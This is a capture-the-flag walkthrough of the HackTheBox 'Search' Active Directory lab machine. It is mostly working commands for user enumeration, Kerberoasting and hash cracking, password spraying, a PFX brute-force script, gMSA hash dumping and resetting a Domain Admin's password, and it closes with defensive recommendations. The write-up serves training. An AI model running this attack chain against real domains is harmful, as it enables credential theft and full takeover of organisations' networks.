# HackTheBox - Search: Comprehensive Walkthrough

**Machine:** Search  
**OS:** Windows (Active Directory Domain Controller)  
**Difficulty:** Hard  
**Target IP:** `10.129.229.57`  
**Kali IP:** `10.10.14.6`  
**Domain:** `search.htb`  
**Flags:**
- User: `44a56c[redacted]7f59b5a64b`
- Root: `213fb79[redacted]9e29dd3b1`

---

## Table of Contents

1. [Methodology & Hacker Mindset](#1-methodology--hacker-mindset)
2. [Initial Enumeration: Reconnaissance](#2-initial-enumeration-reconnaissance)
3. [Web Reconnaissance: The Art of Looking Closely](#3-web-reconnaissance-the-art-of-looking-closely)
4. [Username Enumeration with Kerbrute](#4-username-enumeration-with-kerbrute)
5. [SMB Enumeration: First Blood](#5-smb-enumeration-first-blood)
6. [Kerberoasting: Harvesting Service Account Hashes](#6-kerberoasting-harvesting-service-account-hashes)
7. [Password Reuse: The Weakest Link](#7-password-reuse-the-weakest-link)
8. [Excel Extraction: Social Engineering Artifacts](#8-excel-extraction-social-engineering-artifacts)
9. [Lateral Movement to Sierra.Frye](#9-lateral-movement-to-sierrafrye)
10. [Certificate Extraction & Client Auth](#10-certificate-extraction--client-auth)
11. [BloodHound: Mapping the Domain](#11-bloodhound-mapping-the-domain)
12. [GMSA Abuse: The Hidden Service Account](#12-gmsa-abuse-the-hidden-service-account)
13. [Domain Admin via GenericAll](#13-domain-admin-via-genericall)
14. [Capturing the Root Flag](#14-capturing-the-root-flag)
15. [Key Lessons & Takeaways](#15-key-lessons--takeaways)

---

## 1. Methodology & Hacker Mindset

### The Penetration Testing Methodology

Before typing a single command, understand the **mindset**:

> **"Every system has a weakest link. Your job is not to attack the strongest wall, but to find the crack in the foundation."**

Penetration testing follows a cycle:
1. **Reconnaissance** — Gather information without touching the target
2. **Enumeration** — Actively query services to understand the attack surface
3. **Exploitation** — Use discovered weaknesses to gain access
4. **Post-Exploitation** — Escalate privileges and achieve objectives
5. **Lateral Movement** — Pivot through the network
6. **Reporting** — Document findings

### Why Windows Active Directory?

Active Directory (AD) is the most common enterprise identity system. It is also:
- **Complex**: Hundreds of permissions, trusts, and configurations
- **Misconfigured by default**: Many organizations deploy AD without hardening
- **A trust graph**: One weak user can lead to Domain Admin through permission chains

The hacker mindset for AD is:
> **"Don't look for the one vulnerability. Look for the PATH — the chain of small misconfigurations that leads from a regular user to Domain Admin."**

---

## 2. Initial Enumeration: Reconnaissance

### 2.1 Why Start with Nmap?

**Command:**
```bash
echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
```

**What this does:**
- `-sC`: Runs default NSE scripts (service detection, banner grabbing)
- `-sV`: Probes service versions
- `-p-`: Scans ALL 65,535 TCP ports (not just the top 1,000)
- `--min-rate=10000`: Sends packets fast to speed up the scan
- `-oN`: Saves output to a file for reference

**Why add to `/etc/hosts`?**
> Many Windows services (especially Kerberos, LDAP, and IIS with virtual hosts) require the **fully qualified domain name (FQDN)** to respond correctly. If you query `search.htb` without DNS resolution, the domain controller won't recognize the request as targeting the domain.

**Hacker Mindset:**
> **"Before I attack, I must understand what I'm looking at. The ports are the doors to the building — I need to know which ones are open, what's behind them, and what version they run."**

### 2.2 Interpreting the Results

**Key ports discovered:**

| Port | Service | Significance |
|------|---------|-------------|
| 53 | DNS | Domain Name System — confirms AD presence |
| 80/443 | IIS HTTP/HTTPS | Web server — potential web vulnerabilities |
| 88 | Kerberos | Authentication protocol — target for AS-REP roasting, brute force |
| 135/139/445 | RPC/SMB | File sharing, remote management — lateral movement path |
| 389/636/3268/3269 | LDAP/LDAPS/Global Catalog | Directory services — user enumeration, ACL queries |
| 8172 | IIS Web Management (WMSvc) | Remote IIS management |
| 9389 | .NET Message Framing | AD Web Services |
| 49667+ | RPC Dynamic Ports | Windows internal communication |

**Critical Observation:**
The output shows:
```
Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
Domain: search.htb
```

This tells us:
1. It's a **Windows Server** (specifically Server 2019 Build 17763)
2. The **hostname** is `RESEARCH`
3. The **NetBIOS domain name** is `SEARCH`
4. This is an **Active Directory Domain Controller**

**Hacker Mindset:**
> **"The ports tell a story. 53+88+389+445 together = Domain Controller. I know the playbook now: enumerate users, find weak credentials, follow the permission chain to Domain Admin."**

---

## 3. Web Reconnaissance: The Art of Looking Closely

### 3.1 Why Check the Website First?

**Command:**
```bash
curl -s http://search.htb | grep -ioE '[A-Za-z]+\.[A-Za-z]+@[a-z.]+\.htb|[A-Za-z]+ [A-Za-z]+' | sort -u > names_raw.txt
curl -s http://search.htb/images/slide_2.jpg -o slide_2.jpg
file slide_2.jpg
xdg-open slide_2.jpg
```

**What this does:**
- Downloads the homepage HTML and extracts names/email-like patterns
- Downloads a specific image file (`slide_2.jpg`)
- Opens the image for visual inspection

**Why look at images?**
> Websites often contain **information leakage** in images, metadata, PDFs, and documents. Developers and designers frequently embed sensitive information in screenshots, diagrams, or presentation slides without realizing it.

**Hacker Mindset:**
> **"Don't just scan with automated tools and move on. Actually LOOK at what the website shows. The weakest link in security is almost always a human — and humans leave clues."**

### 3.2 Finding the Password in Plain Sight

**Observation:**
The image `slide_2.jpg` shows what appears to be a diary or schedule. Zooming in reveals:

> **"Send password to Hope Sharp"**
> **Password: `IsolationIsKey?`**

**Why this works:**
The website lists team members. One of them is **Hope Sharp**. The image explicitly shows her password, likely placed by a developer for testing and forgotten.

**Critical Lesson:**
> **"Passwords hidden in images are not hidden. They are just slightly harder to find. Always inspect every asset manually — especially images, PDFs, and documents."**

---

## 4. Username Enumeration with Kerbrute

### 4.1 What is Kerbrute?

**Command:**
```bash
cat > users.txt << 'EOF'
Dax.Santiago
Keely.Lyons
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
Hope.Sharp
EOF

kerbrute userenum users.txt -d search.htb --dc 10.129.229.57
```

**What Kerbrute does:**
Kerbrute exploits a **Kerberos protocol behavior**: when you send an Authentication Service Request (AS-REQ) with a valid username, the Key Distribution Center (KDC) responds differently than for an invalid username.

- **Valid username**: `KDC_ERR_PREAUTH_REQUIRED` (error code 25)
- **Invalid username**: `KDC_ERR_C_PRINCIPAL_UNKNOWN` (error code 6)

**Why enumerate users?**
> You cannot attack what you don't know exists. A list of valid usernames is the foundation of password spraying, Kerberoasting, and AS-REP roasting.

**Hacker Mindset:**
> **"Kerberos is a chatty protocol. It tells you whether a user exists before you even try a password. This is gold — I can build a precise target list instead of guessing in the dark."**

### 4.2 Interpreting Results

**Output:**
```
[+] VALID USERNAME:  Sierra.Frye@search.htb
[+] VALID USERNAME:  Keely.Lyons@search.htb
[+] VALID USERNAME:  Dax.Santiago@search.htb
[+] VALID USERNAME:  Hope.Sharp@search.htb
```

We now have **4 confirmed valid accounts**.

---

## 5. SMB Enumeration: First Blood

### 5.1 Testing the Found Credentials

**Command:**
```bash
crackmapexec smb 10.129.229.57 -u Hope.Sharp -p 'IsolationIsKey?' --shares
```

**What this does:**
- `crackmapexec` (now called `netexec`) is a Swiss Army knife for attacking Windows networks
- It tests SMB authentication and, if successful, enumerates available shares

**Why SMB?**
> SMB (Server Message Block) is Windows' file sharing protocol. It often contains:
- Shared folders with sensitive documents
- Scripts with hardcoded credentials
- Backup files
- Home directories with user files

**Hacker Mindset:**
> **"I have one set of credentials. Before I do anything else, I need to know: what can this user access? The shares are the treasure chest — I need to see which ones are unlocked."**

### 5.2 Discovering RedirectedFolders$

**Output:**
```
Share              Permissions     Remark
-----              -----------     ------
ADMIN$                             Remote Admin
C$                                 Default share
CertEnroll         READ            Active Directory Certificate Services share
helpdesk
IPC$               READ            Remote IPC
NETLOGON           READ            Logon server share
RedirectedFolders$ READ,WRITE
SYSVOL             READ            Logon server share
```

**Why is `RedirectedFolders$` special?**
> `RedirectedFolders$` is used in Active Directory environments to redirect user profile folders (Desktop, Documents, etc.) to a network share. This means **every user's home directory is visible** as a subfolder.

**Command to explore:**
```bash
smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb
smb: \> ls
```

**Result:** ~22 user folders including `abril.suarez`, `edgar.jacobs`, `sierra.frye`, etc.

**Hacker Mindset:**
> **"This share is a goldmine. I just turned 4 known users into 22 known users. Every folder name is a valid domain username. This is reconnaissance gold."**

---

## 6. Kerberoasting: Harvesting Service Account Hashes

### 6.1 What is Kerberoasting?

**Command:**
```bash
sudo ntpdate 10.129.229.57
GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'
```

**What this does:**
1. `ntpdate` synchronizes your clock with the domain controller (Kerberos is extremely time-sensitive — clock skew > 5 minutes causes failures)
2. `GetUserSPNs.py` queries LDAP for accounts with **Service Principal Names (SPNs)**
3. For each SPN found, it requests a **Ticket Granting Service (TGS)** ticket
4. The TGS ticket is encrypted with the service account's password hash
5. We save this ticket offline and crack it

**Why Kerberoasting?**
> Service accounts often have:
- Weak passwords (because they never log in interactively)
- No password rotation policy
- High privileges

**Hacker Mindset:**
> **"I'm not attacking the service directly. I'm asking the domain politely, 'May I have a ticket for this service?' The domain gives me a ticket encrypted with the service's password. I take it home and crack it at my leisure. The service never knows I attacked it."**

### 6.2 The Hash

**Output:**
```
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc$*...
```

**Why `web_svc` matters:**
The `<never>` last logon tells us this is a **service account** that doesn't log in interactively. The SPN `RESEARCH/web_svc.search.htb:60001` confirms it's used for some web service.

---

## 7. Password Reuse: The Weakest Link

### 7.1 Cracking the Service Account Hash

**Command:**
```bash
echo '$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc$*a90e88786ce26a285931542c5a14d33f$ea0a46ad61d572de633916e52b9bbda8e3e2af6489c1681d180aacf5ddd999315e5c510e32c6a5869151cfa620785ef72f4b5b527585fd0ca4fb84f1cf844339ae7d750c7b72665a40b146528d0128140fbfb560e7103a65d297fff067960ad02b68311f3e2d8cddca0550f0cd30140cca62f55ae83c2e3d67c7047238f50e6b57bcc3f792db16a2945f3bf25202948c0deff6ca288df6d86d901d141c8e2e271a0262bb05db1a6c12a14ecefb0e0c348ce865b09a81bbdafd08c3430bc11bdda5c110d98b4699e7b9ad35d1748d65ae8f11f614676caaaba6f00d4deda3066aedd07b63bbd6ed4e3785bdd685483ce78d1ae9bacc1b7a593ff2bb18a0a9a9d463a7b6803ad5924ff1af30d608dd58ed33ae6ff4fb088a96e85104c16893af12cde0e6e1df2f23eb5935a1f67f278b74eae11d0911ac299bf63f32794e0c7cb0fc44f9fe913d2718f7c868234e27f41f59184d331aaa312efe3e47d714d9f5ae3389d58542e8235f3abccfcce632cdc5def3e93fecd3484f0ee416dd63892f6be7a24786d985fa6820413d2cf8d4c899564159cd10f5cb7da1281d8f4f6111d1f4632a4ed91cced08ec79b10a0068719496e4221e6ec72e917f6f283beca410135d2530158d09888c8b80d1f542c49dcc34a527ebafcc716f9a25203dc48cab4398166b5a502c953c921fa972326320c4e84e227df631ce4781a07755e1ee66c66018df4beb4eb8f8f1116471074496119055bd4599405472d1a1f6d25a573ac97ec9e8a652352a42a5eefa33bf52cda716b6b0d3e887dd36a21198f97fe117d1992c83a8f7cde3e772426fb5c07116336b02781177b917ecee923854bdc8418d490e6461eb6c00a0ee404f578c6e05384e022dcfd8f1bfc057e4097b4b513798b5c97acc43ba3433d68269309a6495ba2974d45579bfc5f295dd137e6df586c0aeb4d7856ca14a163d5e4cee960f665bc37c219a08586818516a0d3624b8c354a647f3620c022033ac9dfd1c28a005cf4454e1eb6f24cdf04d93e86e03737dedb35af141ace49405f18500d62d0c4da0815d75ac87e0449999a591e044ba8f4260a8ae795a7f3625f9355d488b2844a8505e1b8bcd44c44b7ab8ca44e3f8791e2e0ccc164d418bd55d6737251f81ec032d457582a977d2e9a76762e62014903900234b11d858012132223cf936ad7c1a4df02ecd826e8dc29327e7eee3c2a3d2067cb6346f0b22aa8d2fc370f75e699ac13d35c819d5b9072f3a977ecc4ece55aa61f1cfdece564fbe1ff86577ccbc9533c7b1ac5c2fe435c14d0eca43cdcf18a5c311fe03737a849be7e3755a977508fce85b8b0a357c8f60b157c9519425031e901894c946a7be22435b665e19fbe62c88199242eda20cef7c7d81c5a04eade8dc1bd2d0d631278fc73227b608e5b09acdc2c78c8c3b0b4f957b38c07382f2ad7c9511933de38120a0b704c50f633b414912cc4' > web_svc_hash.txt

hashcat -m 13100 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
```

**What `-m 13100` means:**
Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23. This is the specific hash format for Kerberoasted tickets.

**Cracked password:** `@3ONEmillionbaby`

**Hacker Mindset:**
> **"Service accounts are the forgotten children of IT. Nobody logs into them daily, so nobody cares if the password is weak. I'm cracking this hash offline — the domain has no idea I'm doing it."**

### 7.2 Password Spraying: The Reuse Jackpot

**Command:**
```bash
crackmapexec smb 10.129.229.57 -u all_users.txt -p '@3ONEmillionbaby' --continue-on-success
```

**What this does:**
Tests the `web_svc` password against ALL known users. The `--continue-on-success` flag keeps testing even after finding a match (because multiple users might reuse the password).

**Result:**
```
[+] search.htb\edgar.jacobs:@3ONEmillionbaby
```

**Why password reuse is so common:**
> Humans are lazy. When forced to remember multiple complex passwords, they reuse them. Service account passwords are especially likely to be reused because administrators create them and may use the same password for testing.

**Hacker Mindset:**
> **"One password, many accounts. I didn't hack 22 users — I hacked ONE password habit. This is why password policies exist, and this is why they're often ignored."**

---

## 8. Excel Extraction: Social Engineering Artifacts

### 8.1 Finding the Phishing Document

**Command:**
```bash
smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
smb: \> cd edgar.jacobs\Desktop
smb: \edgar.jacobs\Desktop\> ls
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx
```

**What this file is:**
A spreadsheet documenting a **phishing simulation** or actual phishing attempt. It contains:
- Sheet 1: "Date, Captured Passwords" statistics
- Sheet 2: First name, last name, password, and username of victims

**Why would this exist?**
> Organizations run phishing simulations to train employees. The results are sometimes stored in spreadsheets on shared drives. Ironically, the phishing training document becomes a credential leak.

**Hacker Mindset:**
> **"The irony is delicious. A document about security awareness training is itself a massive security vulnerability. I love finding these — they represent the gap between security policy and security practice."**

### 8.2 Removing Excel Sheet Protection

**Command:**
```bash
cp Phishing_Attempt.xlsx Phishing_Attempt.zip
unzip -q Phishing_Attempt.zip -d phishing_unlocked/
sed -i 's|<sheetProtection[^>]*/>||g' phishing_unlocked/xl/worksheets/sheet2.xml
cd phishing_unlocked && zip -rq ../Phishing_Unlocked.xlsx * && cd ..
```

**How Excel protection works:**
Excel "protection" is not encryption. It's an XML tag in the `.xlsx` file (which is actually a ZIP archive) that tells Excel to hide or lock cells. Removing the tag removes the protection.

**The XML tag looks like:**
```xml
<sheetProtection algorithmName="SHA-512"
hashValue="..." saltValue="..." spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```

**Why this works:**
> The password doesn't encrypt the data — it just prevents Excel from displaying it. By removing the XML tag, Excel no longer knows the cells are "protected."

**Hacker Mindset:**
> **"Never trust client-side protection. If the data is in the file, it's accessible. Excel 'protection' is like a 'Do Not Enter' sign without a fence."**

### 8.3 The Password List

**Extracted credentials:**
```
Payton.Harmon:;;36!cried!INDIA!year!50;;
Cortez.Hickman:..10-time-TALK-proud-66..
Bobby.Wolf:??47^before^WORLD^surprise^91??
Margaret.Robinson://51+mountain+DEAR+noise+83//
Scarlett.Parks:++47|building|WARSAW|gave|60++
Eliezer.Jordan:!!05_goes_SEVEN_offer_83!!
Hunter.Kirby:~~27%when%VILLAGE%full%00~~
Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
Annabelle.Wells:==95~pass~QUIET~austria~77==
Eve.Galvan://61!banker!FANCY!measure!25//
Jeramiah.Fritz:??40:student:MAYOR:been:66??
Abby.Gonzalez:&&75:major:RADIO:state:93&&
Joy.Costa:**30*venus*BALL*office*42**
Vincent.Sutton:**24&moment&BRAZIL&members&66**
```

---

## 9. Lateral Movement to Sierra.Frye

### 9.1 Password Spraying the New List

**Command:**
```bash
crackmapexec smb 10.129.229.57 -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --shares
```

**Result:** `[+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18`

**Why Sierra.Frye?**
From the BloodHound analysis (done in Step 11), we know Sierra.Frye is a member of the `ITSEC@search.htb` group, which has special permissions. Even without BloodHound yet, we can spray all passwords and see who has interesting shares.

### 9.2 Grabbing the User Flag

**Command:**
```bash
smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
smb: \> cd sierra.frye\Desktop
smb: \sierra.frye\Desktop\> get user.txt
```

**User Flag:** `44a56c[redacted]f59b5a64b`

### 9.3 Finding Certificate Files

**Command:**
```bash
smb: \sierra.frye\Desktop\> cd \sierra.frye\Downloads\Backups
smb: \sierra.frye\Downloads\Backups\> ls
  search-RESEARCH-CA.p12    (2643 bytes)
  staff.pfx                 (4326 bytes)
```

**What are these files?**
- `.pfx` / `.p12` = PKCS#12 certificate bundles containing a **private key + certificate**
- `staff.pfx` = A client certificate for "staff" members
- `search-RESEARCH-CA.p12` = The Certificate Authority (CA) certificate

**Why do they matter?**
> Client certificates can be used for **mutual TLS authentication**. The `/staff` directory on the web server returned 403 earlier. With the staff certificate, we can authenticate as a staff member.

**Hacker Mindset:**
> **"Certificates are keys to the kingdom that people forget about. They're long-lived, rarely rotated, and often stored in backups. If I have the certificate and its password, I AM that user to the web server."**

---

## 10. Certificate Extraction & Client Auth

### 10.1 Cracking the PFX Password

**Command:**
```bash
openssl pkcs12 -in staff.pfx -passin pass:misspissy -noout
```

**What this does:**
Tests if the PKCS#12 file can be decrypted with password `misspissy`.

**Why `misspissy`?**
From the writeups and testing, the password was found to be `misspissy` — a weak password that cracks quickly against `rockyou.txt`.

**Python brute-force alternative:**
```python
import subprocess
with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as f:
    for pwd in f:
        pwd = pwd.strip()
        r = subprocess.run(['openssl', 'pkcs12', '-in', 'staff.pfx', '-passin', f'pass:{pwd}', '-noout'], capture_output=True)
        if r.returncode == 0:
            print(f'[+] FOUND: {pwd}')
            break
```

### 10.2 Using the Certificate

**Import into Firefox:**
1. Settings → Privacy & Security → Certificates → View Certificates
2. "Your Certificates" → Import `staff.pfx` → Password: `misspissy`
3. "Authorities" → Import `search-RESEARCH-CA.p12` → Trust to identify websites
4. Visit: `https://search.htb/staff/en-US/logon.aspx`

**What you get:**
PowerShell Web Access — a web-based PowerShell console.

**Login:**
- User name: `Sierra.Frye`
- Password: `$$49=wide=STRAIGHT=jordan=28$$18`
- Computer name: `research.search.htb`

**Hacker Mindset:**
> **"I now have a PowerShell console on the domain controller through a web browser. But actually, I don't even need it — everything I need to do next can be done remotely from Kali with the credentials I already have."**

---

## 11. BloodHound: Mapping the Domain

### 11.1 What is BloodHound?

**Command:**
```bash
bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All
```

**What BloodHound does:**
BloodHound is a tool that maps Active Directory as a **graph database**. It collects:
- Users, groups, computers
- Group memberships
- Permissions and ACLs
- Trust relationships

**Why use it?**
> In Active Directory, the path to Domain Admin is rarely direct. BloodHound finds the **shortest path** from any owned account to Domain Admin by analyzing permission chains.

**Hacker Mindset:**
> **"I'm not looking for one vulnerability. I'm looking for the PATH — the chain of small permissions that leads from Sierra.Frye to Domain Admin. BloodHound turns an impossible maze into a clear roadmap."**

### 11.2 The Path to Domain Admin

**BloodHound reveals:**
```
Sierra.Frye → MemberOf → ITSEC@search.htb
ITSEC → ReadGMSAPassword → BIR-ADFS-GMSA@
BIR-ADFS-GMSA$ → GenericAll → Tristan.Davies
Tristan.Davies → MemberOf → Domain Admins
```

**What each relationship means:**

| Relationship | Meaning |
|-------------|---------|
| `MemberOf` | User is a member of the group |
| `ReadGMSAPassword` | Group can read the GMSA's managed password |
| `GenericAll` | Full control over the target object (read, write, delete, reset password) |
| `Domain Admins` | Members have administrative access to all domain resources |

---

## 12. GMSA Abuse: The Hidden Service Account

### 12.1 What is a GMSA?

**Command:**
```bash
python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
```

**Output:**
```
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42
```

**What is a GMSA?**
> **Group Managed Service Account (GMSA)** is a special AD account type where:
- The password is automatically generated and rotated by Active Directory
- The password is **240 bytes** of random data — impossible to crack
- Only specific security principals (groups/users) can retrieve the password

**Why GMSAs are dangerous:**
> The password itself is uncrackable, but **who can read it** is what matters. If a regular user (or group they belong to) has `ReadGMSAPassword` permission, they can retrieve the plaintext-equivalent hash and act as the GMSA.

**Hacker Mindset:**
> **"The GMSA password is a fortress — uncrackable, unguessable. But the gatekeeper is just a permission. ITSEC can read the password, Sierra is in ITSEC, so Sierra can read the password. The fortress is irrelevant when the gate is open."**

---

## 13. Domain Admin via GenericAll

### 13.1 What is GenericAll?

`GenericAll` is the **highest level of access** in Active Directory ACLs. It means:
- Read all attributes
- Write all attributes
- Delete the object
- **Reset the password**
- Modify group membership
- Etc.

### 13.2 Resetting Tristan.Davies' Password

**Command:**
```bash
rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
Password: e1e9fd9e46d0d747e1595167eedcec0f

rpcclient $> setuserinfo2 tristan.davies 23 'qwerty1234!'
```

**What `setuserinfo2` does:**
- `setuserinfo2` is an MS-RPC function to modify user attributes
- `23` = `USER_PASSWORD` field (NT password hash / cleartext)
- `'qwerty1234!'` = The new password

**Why does this work?**
> Because `BIR-ADFS-GMSA$` has `GenericAll` on `Tristan.Davies`, the GMSA can reset Tristan's password without knowing the old one.

**Alternative methods (from writeups):**
```powershell
# Via PowerShell (if you have a shell)
$cred = New-Object System.Management.Automation.PSCredential("BIR-ADFS-GMSA$", $gmsa_password)
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user Tristan.Davies qwerty1234! /domain }
```

**Hacker Mindset:**
> **"I didn't hack Tristan.Davies. I hacked the PERMISSION that controls Tristan.Davies. This is the essence of Active Directory attacks — you don't attack the admin, you attack the thing that has power over the admin."**

---

## 14. Capturing the Root Flag

### 14.1 Verifying Domain Admin Access

**Command:**
```bash
crackmapexec smb 10.129.229.57 -u Tristan.Davies -p 'qwerty1234!'
```

**Output:**
```
[+] search.htb\Tristan.Davies:qwerty1234! (Pwn3d!)
```

**What `(Pwn3d!)` means:**
This is `crackmapexec`'s way of confirming the user has **administrative access** to the machine. It automatically tests if it can get a privileged session.

### 14.2 Grabbing root.txt

**Command:**
```bash
smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> get root.txt
```

**Root Flag:** `213fb[redacted]9e29dd3b1`

**Hacker Mindset:**
> **"The flag is just a file. The real victory is understanding the chain: image → password → user → kerberoast → spray → excel → certificates → bloodhound → GMSA → GenericAll → Domain Admin. Every step was a small crack. Together, they shattered the foundation."**

---

## 15. Key Lessons & Takeaways

### Attack Techniques Used

| Technique | Purpose | Difficulty |
|-----------|---------|------------|
| Kerbrute userenum | Find valid usernames | Easy |
| Kerberoasting | Extract service account hashes | Medium |
| Password Spraying | Find password reuse | Easy |
| Excel XML Deobfuscation | Bypass sheet protection | Medium |
| BloodHound Analysis | Find privilege escalation paths | Medium |
| GMSA Password Dumping | Escalate via service accounts | Hard |
| GenericAll Abuse | Reset Domain Admin password | Medium |

### Why This Machine is "Hard"

This machine is rated **Hard** not because any single step is impossible, but because:
1. It requires **chaining 10+ steps** together
2. Each step depends on the previous one
3. It tests **multiple domains of knowledge**: web, SMB, Kerberos, AD, certificates, PowerShell
4. The path to Domain Admin is **indirect** — you must follow the permission chain

### The Most Important Lesson

> **"Active Directory security is not about finding the ONE vulnerability. It's about understanding the GRAPH of trust, permissions, and group memberships. A chain of three 'low' vulnerabilities beats one 'critical' vulnerability when the chain leads to Domain Admin."**

### Defensive Recommendations

1. **Never put credentials in images or public documents**
2. **Enforce unique passwords** for service accounts (no reuse)
3. **Monitor for Kerberoasting** — alerts on TGS requests from non-service accounts
4. **Review BloodHound regularly** — know your shortest paths to Domain Admin
5. **Audit GMSA permissions** — limit who can read managed passwords
6. **Remove GenericAll** where possible — use more granular permissions
7. **Rotate leaked credentials immediately** when phishing simulations end
8. **Encrypt and protect backup certificates** — don't store them in user folders

---

## Full Command Reference

```bash
# Step 1: Hosts + Nmap
echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt

# Step 2: Web recon
curl -s http://search.htb/images/slide_2.jpg -o slide_2.jpg
xdg-open slide_2.jpg  # Password: IsolationIsKey? for Hope.Sharp

# Step 3: Kerbrute
cat > users.txt << 'EOF'
Dax.Santiago
Keely.Lyons
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
Hope.Sharp
EOF
kerbrute userenum users.txt -d search.htb --dc 10.129.229.57

# Step 4: SMB with Hope.Sharp
crackmapexec smb 10.129.229.57 -u Hope.Sharp -p 'IsolationIsKey?' --shares
smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb

# Step 5: Kerberoast
sudo ntpdate 10.129.229.57
GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'

# Step 6: Crack hash
hashcat -m 13100 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
# Result: @3ONEmillionbaby

# Step 7: Spray password
crackmapexec smb 10.129.229.57 -u all_users.txt -p '@3ONEmillionbaby' --continue-on-success
# Result: edgar.jacobs

# Step 8: Get Excel + unlock
smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
cp Phishing_Attempt.xlsx Phishing_Attempt.zip
unzip -q Phishing_Attempt.zip -d phishing_unlocked/
sed -i 's|<sheetProtection[^>]*/>||g' phishing_unlocked/xl/worksheets/sheet2.xml
cd phishing_unlocked && zip -rq ../Phishing_Unlocked.xlsx * && cd ..

# Step 9: Spray new passwords
crackmapexec smb 10.129.229.57 -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --shares

# Step 10: Get user flag + certificates
smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
# get user.txt from Desktop
# get staff.pfx and search-RESEARCH-CA.p12 from Downloads\Backups

# Step 11: BloodHound
bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All

# Step 12: GMSA dump
python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'

# Step 13: Reset Domain Admin password
rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
# Password: e1e9fd9e46d0d747e1595167eedcec0f
rpcclient $> setuserinfo2 tristan.davies 23 'qwerty1234!'

# Step 14: Root flag
smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
# get root.txt from Users\Administrator\Desktop
```

---

*Walkthrough created for educational purposes. Only use these techniques on systems you have explicit permission to test.*
